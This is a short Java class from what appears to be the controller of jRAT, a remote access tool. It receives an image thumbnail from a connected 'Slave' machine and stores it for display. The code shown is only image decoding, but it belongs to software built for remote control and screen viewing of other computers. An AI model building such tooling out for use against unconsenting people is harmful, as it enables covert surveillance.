package se.jrat.controller.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.DataInputStream;

import javax.swing.ImageIcon;

import se.jrat.common.utils.ImageUtils;
import se.jrat.controller.Slave;

public class Packet33Thumbnail extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		byte[] buffer = new byte[dis.readInt()];
		slave.getDataInputStream().readFully(buffer);
		
		BufferedImage image = ImageUtils.decodeImage(buffer);
		slave.setThumbnail(new ImageIcon(image));
	}

}
